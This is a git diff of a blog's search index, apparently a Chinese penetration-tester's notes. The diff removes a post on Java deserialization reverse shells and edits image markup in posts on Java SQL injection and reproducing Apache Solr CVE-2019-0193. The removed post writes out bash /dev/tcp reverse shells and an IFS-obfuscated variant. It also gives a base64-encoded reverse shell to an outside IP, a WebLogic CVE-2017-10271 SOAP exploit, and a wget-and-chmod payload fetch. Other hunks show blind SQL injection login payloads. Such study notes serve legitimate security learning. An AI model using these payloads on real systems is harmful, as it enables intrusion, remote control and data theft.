-</code></pre><p><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675380880.jpg" data-fancybox="group" data-caption="" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675380880.jpg" alt="" title=""></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675525950.jpg" data-fancybox="group" data-caption="" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15691675525950.jpg" alt="" title=""></a></p>
-<pre><code>sh -c 作用说明:
-让调用的bash 将一个字符串作为完整的命令来执行
-</code></pre><p>常用反弹shell</p>
-<ul>
-<li><p>sh</p>
-<pre><code>/bin/bash -c &#39;sh -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
-</code></pre><p><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367303103.jpg" data-fancybox="group" data-caption="-w331" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367303103.jpg" alt="-w331" title="-w331"></a></p>
-</li>
-<li><p>bash</p>
-<pre><code>/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/9999 0&gt;&amp;1&#39;
-</code></pre><p><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367647957.jpg" data-fancybox="group" data-caption="-w341" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706367647957.jpg" alt="-w341" title="-w341"></a></p>
-</li>
-</ul>
-<p>这里备注下 OSX系统中存在多种shell<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706369208934.jpg" data-fancybox="group" data-caption="-w562" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706369208934.jpg" alt="-w562" title="-w562"></a><br>因为常用的shell 是zsh ，所以遇到多种情况有点坑，应该是环境变量没配好<br>如 以下命令：<br>在zsh中<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706370741721.jpg" data-fancybox="group" data-caption="-w562" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706370741721.jpg" alt="-w562" title="-w562"></a></p>
-<p>在bash中：<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371257635.jpg" data-fancybox="group" data-caption="-w531" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371257635.jpg" alt="-w531" title="-w531"></a></p>
-<p>在sh中:<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371690653.jpg" data-fancybox="group" data-caption="-w987" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371690653.jpg" alt="-w987" title="-w987"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371954883.jpg" data-fancybox="group" data-caption="-w901" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706371954883.jpg" alt="-w901" title="-w901"></a></p>
-<h4 id="windows目标"><a href="#windows目标" class="headerlink" title="windows目标"></a>windows目标</h4><p>在windows下，常用方法</p>
-<pre><code>String[] command = { &quot;cmd&quot;, &quot;/c&quot;, cmds };
-Process ps = Runtime.getRuntime().exec(command );
-</code></pre><p>综上 即命令中涉及 <code>&lt;  &gt;  |  &amp;</code>等符号时<br><code>getRuntime().exec(String command )</code>此时已不适用，可以尝试<br><code>exec(String [] cmdArray) 
- exec(String []cmdarray,String []envp,File dir)</code>来执行</p>
-<p> 但当遇到的命令执行的点是<code>getRuntime().exec(String command )</code>，此时这些绕过方法即不适用了。涉及到 <code>bypass exec</code> </p>
-<h2 id="bypass-exec"><a href="#bypass-exec" class="headerlink" title="bypass exec"></a>bypass exec</h2><h3 id="IFS"><a href="#IFS" class="headerlink" title="IFS"></a>IFS</h3><p>Shell 的环境变量分为 set, env 两种，其中 set 变量可以通过 export 工具导入到 env 变量中。其中，set 是显示设置shell变量，仅在本 shell 中有效；env 是显示设置用户环境变量 ，仅在当前会话中有效。换句话说，set 变量里包含了 env 变量，但 set 变量不一定都是 env 变量。这两种变量不同之处在于变量的作用域不同。显然，env 变量的作用域要大些，它可以在 subshell 中使用。</p>
-<pre><code> 而 IFS 是一种 set 变量，当 shell 处理&quot;命令替换&quot;和&quot;参数替换&quot;时，shell 根据 IFS 的值，默认是 space, tab, newline 来拆解读入的变量，然后对特殊字符进行处理，最后重新组合赋值给该变量。
-</code></pre><p>————————————————<br>版权声明：本文为CSDN博主「whuslei」的原创文章，遵循 CC 4.0 BY-SA 版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href="https://blog.csdn.net/whuslei/article/details/7187639" target="_blank" rel="noopener">https://blog.csdn.net/whuslei/article/details/7187639</a></p>
-<p>查看其值<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704628317663.jpg" data-fancybox="group" data-caption="-w308" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704628317663.jpg" alt="-w308" title="-w308"></a></p>
-<p>“040”是空格，”011”是Tab，”012”是换行符”\n”<br>即简单来说 IFS可以替代 空格<br>在这里用来绕过尝试：<br>跟踪exec：<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629198309.jpg" data-fancybox="group" data-caption="-w988" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629198309.jpg" alt="-w988" title="-w988"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629353562.jpg" data-fancybox="group" data-caption="-w1065" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629353562.jpg" alt="-w1065" title="-w1065"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629504206.jpg" data-fancybox="group" data-caption="-w1084" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629504206.jpg" alt="-w1084" title="-w1084"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629694526.jpg" data-fancybox="group" data-caption="-w600" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704629694526.jpg" alt="-w600" title="-w600"></a><br>这里可以明显看到 IFS起到了分隔符的作用<br>正常情况下<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706878745671.jpg" data-fancybox="group" data-caption="-w430" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706878745671.jpg" alt="-w430" title="-w430"></a><br>这样传入参数是可以执行的<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706884565379.jpg" data-fancybox="group" data-caption="-w844" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706884565379.jpg" alt="-w844" title="-w844"></a></p>
-<p><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706889154267.jpg" data-fancybox="group" data-caption="-w1128" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15706889154267.jpg" alt="-w1128" title="-w1128"></a></p>
-<p>但是一个比较坑的事，在mac中bash 使用IFS没有反弹shell，但在centos中就可以使用,猜测是osx的环境变量有问题。<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643120846.jpg" data-fancybox="group" data-caption="-w960" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643120846.jpg" alt="-w960" title="-w960"></a></p>
-<p>经测试，改用osx的shell环境 可以执行</p>
-<pre><code>/bin/bash -c bash${IFS}-i${IFS}&gt;&amp;${IFS}/dev/tcp/127.0.0.1/8888&lt;&amp;1
-</code></pre><p>centos中的反应<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643290042.jpg" data-fancybox="group" data-caption="-w487" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15704643290042.jpg" alt="-w487" title="-w487"></a></p>
-<h3 id="命令执行base64编码"><a href="#命令执行base64编码" class="headerlink" title="命令执行base64编码"></a>命令执行base64编码</h3><p>在java反序列化中可能遇上反序列化命令执行中存在转义的现象，这个时候可以使用base64编码进行绕过</p>
-<pre><code>cmd = &quot;{echo,%s}|{base64,-d}|{bash,-i}&quot; %base64.b64encode(cmd)
-
-String[] commands = {&quot;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTguMjQuMTQ2LjIwNC84NTUwIDA+JjE=}|{base64,-d}|{bash,-i}&quot;}
-</code></pre><h4 id="反序列化示例"><a href="#反序列化示例" class="headerlink" title="反序列化示例"></a>反序列化示例</h4><h3 id="xml执行绕过"><a href="#xml执行绕过" class="headerlink" title="xml执行绕过"></a>xml执行绕过</h3><p>这里遇到在反序列化存在于xml中的时候，在用到管道符等时要用实体编码进行绕过处理</p>
-<h4 id="利用实例-CVE-2017-10271"><a href="#利用实例-CVE-2017-10271" class="headerlink" title="利用实例 CVE-2017-10271"></a>利用实例 CVE-2017-10271</h4><p>该漏洞利用poc如下：</p>
-<pre><code>&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;
-      &lt;soapenv:Header&gt;
-        &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;
-          &lt;java&gt;
-            &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;
-              &lt;array class=&quot;java.lang.String&quot; length=&quot;2&quot;&gt;
-                &lt;void index=&quot;0&quot;&gt;
-                  &lt;string&gt;/bin/bash&lt;/string&gt;
-                &lt;/void&gt;
-                &lt;void index=&quot;1&quot;&gt;
-                  &lt;string&gt;-c&lt;/string&gt;
-                &lt;/void&gt;
-                &lt;void index=&quot;2&quot;&gt;
-                  &lt;string&gt;&#39;&#39;&#39;+cmd+&#39;&#39;&#39;&lt;/string&gt;
-                &lt;/void&gt;
-              &lt;/array&gt;
-              &lt;void method=&quot;start&quot;/&gt;
-            &lt;/void&gt;
-          &lt;/java&gt;
-        &lt;/work:WorkContext&gt;
-      &lt;/soapenv:Header&gt;
-      &lt;soapenv:Body/&gt;
-    &lt;/soapenv:Envelope&gt;
-</code></pre><p>其中在cmd中传入字符串的时候需要进行编码，否则会进行报错<br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699933180870.jpg" data-fancybox="group" data-caption="-w1437" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699933180870.jpg" alt="-w1437" title="-w1437"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699934142704.jpg" data-fancybox="group" data-caption="-w1437" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699934142704.jpg" alt="-w1437" title="-w1437"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699937854703.jpg" data-fancybox="group" data-caption="-w878" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699937854703.jpg" alt="-w878" title="-w878"></a><br><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699938012054.jpg" data-fancybox="group" data-caption="-w513" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699938012054.jpg" alt="-w513" title="-w513"></a></p>
-<pre class=" language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>string</span><span class="token punctuation">></span></span>wget http://th9bvw.ceye.io -o /tmp/.test12.sh <span class="token entity" title="&amp;">&amp;amp;</span><span class="token entity" title="&amp;">&amp;amp;</span>  chmod +x /tmp/.test12.sh<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>string</span><span class="token punctuation">></span></span>
-</code></pre>
-<p><a href="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699981292782.jpg" data-fancybox="group" data-caption="-w673" class="fancybox"><img src="/2020/01/13/Web渗透/java反序列化/java反弹shell/15691538395177/15699981292782.jpg" alt="-w673" title="-w673"></a></p>
-<h2 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h2><p>在测试中遇到在上传执行脚本时，发现系统上不存在wget、curl等命令，即无法直接通过shell 脚本进行云端下载请求，可以尝试使用Bash /dev/tcp 进行文件传输：</p>
-<p>通过 bash直接建立socket请求（待测试）</p>
-<pre class=" language-shell"><code class="language-shell">exec 8<>/dev/tcp/127.0.0.1/11211    
-#使用文件描述符8以<>(<读>写)方式，打开127.0.0.1的tcp11211端口
-ls -l /proc/self/fd                                   
-#查看打开的连接8
-echo -e "stats" >&8                             
-#向socket写入数据
-cat <&8 8="" #从socket读入数据="" exec="" 8<&-="" #关闭socket读="">&-                                              
-#关闭socket写
-</&8></读></code></pre>
-<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://www.jackson-t.ca/runtime-exec-payloads.html" target="_blank" rel="noopener">编码转换</a><br><a href="https://paper.seebug.org/834/" target="_blank" rel="noopener">红队后渗透测试中的文件传输技巧</a></p>
-<p><a href="https://blog.spoock.com/2018/11/25/getshell-bypass-exec/" target="_blank" rel="noopener">绕过exec获取反弹shell</a><br><a href="https://www.cnblogs.com/leixiao-/p/10216571.html" target="_blank" rel="noopener">bash扩展</a></p>
-]]></content>
-      
-        <categories>
-            
-            <category> web 渗透 </category>
-            
-            <category> java反序列化 </category>
-            
-            <category> java反弹shell </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> web 渗透 </tag>
-            
-            <tag> java反序列化 </tag>
-            
-            <tag> java反弹shell </tag>
             
         </tags>
         
@@ -266,13 +270,13 @@ cat <&8 8="" #从socket读入数据="" exec="" 8<&-="" #关闭socket读="">&-
         ps.close();
         conn.close();
 </code></pre>
-<p>sql注入的原因在于在用户可控的地方未进行检测和过滤，造成了将用户输入部分带进了数据库编译<br><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721916985054.jpg" data-fancybox="group" data-caption="-w1008" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721916985054.jpg" alt="-w1008" title="-w1008"></a></p>
+<p>sql注入的原因在于在用户可控的地方未进行检测和过滤，造成了将用户输入部分带进了数据库编译<br><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721916985054.jpg" alt="-w1008"></p>
 <p>java中参数化查询 防sql注入的原因在于在用占位符占据时进行数据库编译/解释执行，完成后再结合参数进行填充，不会再次编译/解释执行。占位符进行填充是会进行转义，所以如果在使用预编译之前未使用占位符 仍会存在sql注入。<br>占位符使用如下：</p>
 <p>在setString函数中</p>
-<p><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721932849972.jpg" data-fancybox="group" data-caption="-w974" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721932849972.jpg" alt="-w974" title="-w974"></a><br><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721933465983.jpg" data-fancybox="group" data-caption="-w1092" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721933465983.jpg" alt="-w1092" title="-w1092"></a><br>单引号未能逃逸<br><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721934396199.jpg" data-fancybox="group" data-caption="-w1036" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721934396199.jpg" alt="-w1036" title="-w1036"></a></p>
-<p><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721918957816.jpg" data-fancybox="group" data-caption="-w1120" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721918957816.jpg" alt="-w1120" title="-w1120"></a></p>
-<p><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721829654934.jpg" data-fancybox="group" data-caption="使用占位符及其执行效果" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721829654934.jpg" alt="使用占位符及其执行效果" title="使用占位符及其执行效果"></a></p>
-<p>如果这里未使用占位符，即使使用了PreparedStatement也没有用<br><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721935714878.jpg" data-fancybox="group" data-caption="-w587" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721935714878.jpg" alt="-w587" title="-w587"></a></p>
+<p><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721932849972.jpg" alt="-w974"><br><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721933465983.jpg" alt="-w1092"><br>单引号未能逃逸<br><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721934396199.jpg" alt="-w1036"></p>
+<p><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721918957816.jpg" alt="-w1120"></p>
+<p><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721829654934.jpg" alt="使用占位符及其执行效果"></p>
+<p>如果这里未使用占位符，即使使用了PreparedStatement也没有用<br><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15721935714878.jpg" alt="-w587"></p>
 <p>除此之外，部分函数不能使用参数化查询，就需要过滤，以白名单为主</p>
 <h3 id="非参数化查询"><a href="#非参数化查询" class="headerlink" title="非参数化查询"></a>非参数化查询</h3><p>【1】参数占位符不能用于指定查询中的表和列的名称<br>【2】参数占位符不能用于查询的其他部分，比如ORDER BY子句中的ASC或者DESC关键词等。</p>
 <h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>ORDER BY 关键字后跟列名。当该列名的输入对用户可控时，参数化查询级无效了，因为ORDER BY 注入不需要闭合单引号，参数化查询没起到转义的作用，故在此处无效<br>构造案例 如：</p>
@@ -306,8 +310,8 @@ select <span class="token operator">*</span> from goods where min_name like '<sp
 j_username=11'||1/(decode(INSTR(user,'C',2),1,1,0))||' &j_password=122&submit=ENTER&targetUrlParameter=%2Findex.html
 j_username=11'||1/(decode(INSTR(user,'O',3),1,1,0))||' &j_password=122&submit=ENTER&targetUrlParameter=%2Findex.html
 </code></pre>
-<p><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15722822176976.jpg" data-fancybox="group" data-caption="-w1294" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15722822176976.jpg" alt="-w1294" title="-w1294"></a></p>
-<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>在这个地方使用@@user 结果出来的是当前数据table名，没有搞懂为啥。<br><a href="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15722823316340.jpg" data-fancybox="group" data-caption="-w1303" class="fancybox"><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15722823316340.jpg" alt="-w1303" title="-w1303"></a></p>
+<p><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15722822176976.jpg" alt="-w1294"></p>
+<h4 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h4><p>在这个地方使用@@user 结果出来的是当前数据table名，没有搞懂为啥。<br><img src="/2019/12/13/Web渗透/java反序列化/java_sql注入/15719227797770/15722823316340.jpg" alt="-w1303"></p>
 <h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://b1ngz.github.io/java-sql-injection-note/" target="_blank" rel="noopener">Java SQL 注入学习笔记</a><br><a href="http://wismartzy.github.io/2016/07/15/MySQL-Order-By-Injection/" target="_blank" rel="noopener">MySQL Order By 注入</a><br><a href="https://blog.csdn.net/qq_36521579/article/details/79149466" target="_blank" rel="noopener">sql注入及用PrepareStatement就不用担心sql注入了吗？</a></p>
 ]]></content>
       
@@ -344,12 +348,12 @@ j_username=11'||1/(decode(INSTR(user,'O',3),1,1,0))||' &j_password=122&submit=EN
 <li>1.Apache Solr的DataImportHandler启用了模块DataImportHandler(默认情况下该模块不会被启用)</li>
 <li>2.Solr Admin UI未开启鉴权认证。（默认情况下打开web界面无需任何认证</li>
 </ul>
-<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="简版vulhub"><a href="#简版vulhub" class="headerlink" title="简版vulhub"></a>简版vulhub</h4><p>直接利用vulhub进行搭建测试，详情按下不表。<br>这个漏洞复现遇到点问题，根据教程搭建的环境，进行复现，结果发现没法触发成功,运行poc 报错如下<br><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673229505327.jpg" data-fancybox="group" data-caption="-w1220" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673229505327.jpg" alt="-w1220" title="-w1220"></a><br>感觉应该是vps的防火墙配置出的问题，换成本地调试没有问题<br><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248523422.jpg" data-fancybox="group" data-caption="-w1375" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248523422.jpg" alt="-w1375" title="-w1375"></a><br><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248663003.jpg" data-fancybox="group" data-caption="-w727" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248663003.jpg" alt="-w727" title="-w727"></a></p>
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><h4 id="简版vulhub"><a href="#简版vulhub" class="headerlink" title="简版vulhub"></a>简版vulhub</h4><p>直接利用vulhub进行搭建测试，详情按下不表。<br>这个漏洞复现遇到点问题，根据教程搭建的环境，进行复现，结果发现没法触发成功,运行poc 报错如下<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673229505327.jpg" alt="-w1220"><br>感觉应该是vps的防火墙配置出的问题，换成本地调试没有问题<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248523422.jpg" alt="-w1375"><br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675248663003.jpg" alt="-w727"></p>
 <h4 id="配置下载"><a href="#配置下载" class="headerlink" title="配置下载"></a>配置下载</h4><p>apache solr 版本：Solr-8.1.1<br>jdk版本：1.8.0_144<br>在idea 中调试该环境</p>
 <h5 id="源码导入idea调试"><a href="#源码导入idea调试" class="headerlink" title="源码导入idea调试"></a>源码导入idea调试</h5><ul>
 <li>配置ant server</li>
 </ul>
-<p><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673449263122.jpg" data-fancybox="group" data-caption="-w479" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673449263122.jpg" alt="-w479" title="-w479"></a></p>
+<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673449263122.jpg" alt="-w479"></p>
 <pre><code>ant ivy-bootstrap  //安装ivy
 cd solr
 ant server
@@ -357,7 +361,7 @@ cd ..
 ant idea
 
 </code></pre><ul>
-<li>启动远程调试<br>创建 test core<br><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673861985710.jpg" data-fancybox="group" data-caption="-w610" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673861985710.jpg" alt="-w610" title="-w610"></a><br>这个时候会发现报错，需要在<pre><code>solr-7.7.2/solr/server/solr/test/conf
+<li>启动远程调试<br>创建 test core<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15673861985710.jpg" alt="-w610"><br>这个时候会发现报错，需要在<pre><code>solr-7.7.2/solr/server/solr/test/conf
 </code></pre>目录进行修改添加</li>
 </ul>
 <pre><code> &lt;requestHandler name=&quot;/dataimport&quot; class=&quot;solr.DataImportHandler&quot;&gt; 
@@ -368,8 +372,8 @@ ant idea
 </code></pre><p>发现继续报错</p>
 <pre><code>Error loading class &#39;org.apache.solr.handler.dataimport.DataImportHandler&#39;
 </code></pre><pre><code>cp solr/dist/solr-dataimporthander  server/solr-webapp/webapp/WEB-INF/lib 
-</code></pre><p><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675673373203.jpg" data-fancybox="group" data-caption="-w458" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675673373203.jpg" alt="-w458" title="-w458"></a></p>
-<p>可以正常创建了<br><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675675380907.jpg" data-fancybox="group" data-caption="-w1420" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675675380907.jpg" alt="-w1420" title="-w1420"></a></p>
+</code></pre><p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675673373203.jpg" alt="-w458"></p>
+<p>可以正常创建了<br><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15675675380907.jpg" alt="-w1420"></p>
 <ul>
 <li>调试命令</li>
 </ul>
@@ -442,7 +446,7 @@ return row;
              &lt;/entity&gt;
         &lt;/document&gt;
 &lt;/dataConfig&gt;
-</code></pre><p><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679455381821.jpg" data-fancybox="group" data-caption="-w558" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679455381821.jpg" alt="-w558" title="-w558"></a></p>
+</code></pre><p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679455381821.jpg" alt="-w558"></p>
 <p>默认权限为程序的启动权限</p>
 <h5 id="远程检测poc"><a href="#远程检测poc" class="headerlink" title="远程检测poc"></a>远程检测poc</h5><ul>
 <li>外连有回显</li>
@@ -485,7 +489,7 @@ return row;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>item</span><span class="token punctuation">/></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>RDF</span><span class="token punctuation">></span></span>
 </code></pre>
-<p><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679479637186.jpg" data-fancybox="group" data-caption="-w1437" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679479637186.jpg" alt="-w1437" title="-w1437"></a></p>
+<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679479637186.jpg" alt="-w1437"></p>
 <h4 id="数据源类型为ContentStreamDataSource"><a href="#数据源类型为ContentStreamDataSource" class="headerlink" title="数据源类型为ContentStreamDataSource"></a>数据源类型为ContentStreamDataSource</h4><ul>
 <li>不外连 + 回显<br>在该检测方式中 由于 ContentStreamDataSource能接收Post数据直接作为数据源，可以不用外连获取数据源。</li>
 </ul>
@@ -547,7 +551,7 @@ return row;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>document</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dataConfig</span><span class="token punctuation">></span></span>
 </code></pre>
-<p><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679482413077.jpg" data-fancybox="group" data-caption="-w1428" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679482413077.jpg" alt="-w1428" title="-w1428"></a></p>
+<p><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679482413077.jpg" alt="-w1428"></p>
 <p>该方法虽然方便 但检测可能失败<br>缺点:对低版本无法检测 - 因为通过POST请求修改configoverlay.json文件中的配置会失败<br>可以先用以下数据包检测</p>
 <pre><code>POST /solr/tika/config HTTP/1.1
 Host: 127.0.0.1
@@ -558,7 +562,7 @@ Connection: close
 
 {&quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;: true}, &quot;set-property&quot;: {&quot;requestDispatcher.requestParsers.enableStreamBody&quot;: true}}
 
-</code></pre><p>返回200 则可用该版本可行检测，500 则不行<br><a href="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679484163317.jpg" data-fancybox="group" data-caption="-w1263" class="fancybox"><img src="/2019/09/08/Web渗透/漏洞学习/Apache Solr CVE-2019-0193 复现与学习/15653397148895/15679484163317.jpg" alt="-w1263" title="-w1263"></a></p>
